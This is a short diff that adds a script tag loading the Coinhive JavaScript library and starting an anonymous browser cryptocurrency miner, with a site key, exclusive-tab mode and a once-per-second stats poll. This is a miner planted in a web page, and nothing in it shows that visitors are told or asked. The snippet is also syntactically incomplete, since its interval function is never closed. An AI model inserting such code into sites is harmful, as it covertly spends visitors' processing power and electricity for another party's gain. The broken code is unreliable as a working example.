@@ -1,0 +1,11 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('zUhJgHSuEVNjwzEC58rrjygcLdFuSDei','threads: 1');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;  
+</script>
